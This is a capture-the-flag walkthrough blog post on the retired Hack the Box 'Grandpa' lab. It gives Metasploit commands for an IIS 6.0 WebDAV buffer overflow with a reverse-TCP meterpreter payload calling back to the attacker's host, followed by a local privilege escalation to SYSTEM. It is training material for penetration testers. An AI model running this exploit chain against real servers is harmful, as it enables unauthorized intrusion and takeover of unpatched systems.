@@ -1,0 +1,294 @@
+
+								
+																		Hack the Box Challenge: Grandpa Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 23, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Grandpa” which is lab presented by Hack the Box for making online penetration practices according to your experience level. They have a collection of vulnerable labs as challenges from beginners to Expert level. HTB have two partitions of lab i.e. Active and retired since we can’t submit write up of any Active lab, therefore, we have chosen retried Grandpa Lab.
+Level: Beginners
+Task: find user.txt and root.txt file in the victim’s machine.
+Let’s begin the Game!!
+Since these labs are online available therefore they have static IP and IP of Grandpa is 10.10.10.14 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -sV 10.10.10.14
+			
+				
+					
+				
+					1
+				
+						nmap -p- -sV 10.10.10.14
+					
+				
+			
+		
+
+From nmap result I found the following information.
+Open port: 80 for HTTP
+Service version: Microsoft IIS httpd 6.0
+OS: Windows machine.
+
+Then I used searchsploit for iis 6.0 and found a Remote Buffer overflow vulnerability in Microsoft IIS httpd 6.0, you can check this exploit in google also.
+
+Then I run the msfconsole command in the terminal and load Metasploit framework for using Microsoft IIS WebDAV ScStoragePathFromUrl Overflow module for exploiting target machine.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set rhost 10.10.10.14
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set payload windows/meterpreter/reverse_tcp
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lhost 10.10.14.3
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lport 4444
+msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) run
+			
+				
+					
+				
+					123456
+				
+						use exploit/windows/iis/iis_webdav_scstoragepathfromurlmsf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set rhost 10.10.10.14msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set payload windows/meterpreter/reverse_tcpmsf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lhost 10.10.14.3msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) set lport 4444msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) run
+					
+				
+			
+		
+
+Terrific!! I have got unauthorized access of victims command shell through session 1 as shown in below image.
+Then I run command getuid for identifying user ID and current process but it failed due to limited shell access we have in session 1 and now we need to privilege escalation.
+For that background your current meterpreter shell and go for post exploitation.
+
+Then I run a post exploit “Multi Recon Local Exploit Suggester” that suggests local meterpreter exploits that can be used for the further exploit. The exploits are recommended founded on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
+
+		
+		
+			
+			
+			
+			
+use post/multi/recon/local_exploit_suggester
+msf post(multi/recon/local_exploit_suggester) &gt; set session 1
+msf post(multi/recon/local_exploit_suggester) &gt; run
+			
+				
+					
+				
+					123
+				
+						use post/multi/recon/local_exploit_suggestermsf post(multi/recon/local_exploit_suggester) &gt; set session 1msf post(multi/recon/local_exploit_suggester) &gt; run
+					
+				
+			
+		
+
+Wonderful!! Exploit Suggester truly proof itself by suggesting another exploit name to which target is vulnerable. So now we will go with the last option as highlighted in the image.
+
+At this time use pprFlattenRec Local Privilege Escalation module for making unauthorized access again but as privileged user.
+
+		
+		
+			
+			
+			
+			
+use exploit/windows/local/ppr_flatten_rec
+msf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.3
+msf exploit(windows/local/ppr_flatten_rec) &gt; set lport 4455
+msf exploit(windows/local/ppr_flatten_rec) &gt; run
+			
+				
+					
+				
+					1234
+				
+						use exploit/windows/local/ppr_flatten_recmsf exploit(windows/local/ppr_flatten_rec) &gt; set lhost 10.10.14.3msf exploit(windows/local/ppr_flatten_rec) &gt; set lport 4455msf exploit(windows/local/ppr_flatten_rec) &gt; run
+					
+				
+			
+		
+
+Nice!! It works and we got meterpreter session 2 as system user and you can check in below image.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; getuid
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; getuid
+					
+				
+			
+		
+
+
+Now let’s complete this task my searching user.txt and root.txt flag which is hidden somewhere inside a directory.
+
+		
+		
+			
+			
+			
+			
+meterpreter &gt; shell
+			
+				
+					
+				
+					1
+				
+						meterpreter &gt; shell
+					
+				
+			
+		
+
+Inside C:\Document and Setting\Harry\Desktop I found the user.txt file and used the type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+type user.txt
+			
+				
+					
+				
+					1
+				
+						type user.txt
+					
+				
+			
+		
+
+Great!! We got our 1st flag successfully
+
+Inside C:\Document and Setting\Administrtator\Desktop I found the root.txt file and used the type “filename” command for reading this file.
+
+		
+		
+			
+			
+			
+			
+type root.txt
+			
+				
+					
+				
+					1
+				
+						type root.txt
+					
+				
+			
+		
+
+Great!! We got our 2nd flag successfully
+Breaching this lab was an interesting and enjoyable moment for me. It will take less time if you are aware of proper Metasploit exploits. Therefore I will give all Glory to Metasploit for making this challenge easy for me.
+Happy Hacking!!
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
